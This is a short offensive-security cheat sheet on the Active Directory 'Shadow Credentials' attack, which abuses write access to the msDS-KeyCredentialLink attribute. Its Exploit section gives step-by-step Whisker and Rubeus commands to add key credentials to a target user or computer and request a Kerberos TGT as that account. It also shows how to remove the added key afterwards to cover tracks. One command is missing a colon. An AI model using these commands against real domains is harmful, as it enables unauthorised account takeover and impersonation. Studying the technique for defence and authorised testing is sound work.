# Shadow Credentials
---

## Vulnerability

If you have permissions to write on `msDS-KeyCredentialLink` of a domain user or computer, you can modify it to obtain a TGT for it and therefore, impersonate it.

## Prerequisites

* Write permission on `msDS-KeyCredentialLink` attribute of a domain user or computer.

## Exploit

For the following exploit, in the case the target is a computer, **don't forget** to add the `$` at the end of the `samAccountName`.

```powershell
# Get keys of the target.
.\Whisker.exe list /target$samAccountName

# Add a new pair of keys to the target.
.\Whisker.exe add /target:$samAccountName

# Request a TGT with the certificate and password generated with Whisker.
Rubeus.exe asktgt /user:$samAccountName /certificate:$certificate /password:$password /nowrap

# Remove the key you added.
.\Whisker.exe remove /target:$samAccountName /deviceid:$deviceId
```

## Useful links

* [Elad Sharmir's](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) article about shadow credentials.